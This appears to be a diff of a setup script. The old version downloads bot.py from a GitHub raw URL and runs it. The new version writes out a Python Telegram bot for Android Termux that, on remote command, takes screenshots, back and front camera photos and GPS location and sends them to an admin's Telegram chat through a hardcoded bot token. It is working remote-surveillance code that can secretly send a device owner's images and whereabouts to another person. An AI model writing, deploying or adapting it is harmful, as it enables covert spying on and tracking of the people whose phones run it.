@@ -1,6 +1,87 @@
-cd ~
-rm bot.py
-curl -o bot.py https://raw.githubusercontent.com/KiselST/Scream/main/Konus
-sed -i 's/print("Запуск...")/print("Запуск...")\n        print(f"Команда: {txt} от {cid}")/' bot.py
-pip install requests
-python bot.py
+cat > bot.py << 'EOF'
+import requests
+import os
+import time
+
+TOKEN = "8845897358:AAFwhSC_b4oSXGeIsBtaiHabIvkbiXjpQIc"
+ADMIN = "6196009774"
+
+print("Запуск...")
+last = 0
+
+while True:
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last+1}"
+        r = requests.get(url, timeout=30).json()
+        
+        for u in r.get("result", []):
+            last = u["update_id"]
+            m = u.get("message", {})
+            cid = str(m.get("chat", {}).get("id"))
+            txt = m.get("text", "")
+            
+            print(f"Команда: {txt} от {cid}")
+            
+            if cid != ADMIN:
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Нет доступа"})
+                continue
+            
+            if txt == "/start":
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Бот работает! /screen /camera /selfie /gps"})
+            
+            elif txt == "/screen":
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Делаю скрин..."})
+                os.system("screencap -p /sdcard/screen.png")
+                try:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+                        data={"chat_id": cid, "caption": "Экран"},
+                        files={"photo": open("/sdcard/screen.png", "rb")})
+                except:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        data={"chat_id": cid, "text": "Ошибка скрина (нужен root)"})
+            
+            elif txt == "/camera":
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Фоткаю..."})
+                os.system("termux-camera-photo -c 0 /sdcard/cam.jpg")
+                try:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+                        data={"chat_id": cid, "caption": "Задняя камера"},
+                        files={"photo": open("/sdcard/cam.jpg", "rb")})
+                except:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        data={"chat_id": cid, "text": "Ошибка камеры"})
+            
+            elif txt == "/selfie":
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Фоткаю..."})
+                os.system("termux-camera-photo -c 1 /sdcard/selfie.jpg")
+                try:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+                        data={"chat_id": cid, "caption": "Передняя камера"},
+                        files={"photo": open("/sdcard/selfie.jpg", "rb")})
+                except:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        data={"chat_id": cid, "text": "Ошибка камеры"})
+            
+            elif txt == "/gps":
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Ищу GPS..."})
+                os.system("termux-location > /sdcard/gps.txt")
+                try:
+                    with open("/sdcard/gps.txt", "r") as f:
+                        data = f.read()
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        data={"chat_id": cid, "text": "GPS:\n" + data[:400]})
+                except:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        data={"chat_id": cid, "text": "Ошибка GPS"})
+        
+        time.sleep(2)
+    except Exception as e:
+        print(f"Ошибка: {e}")
+        time.sleep(5)
+EOF
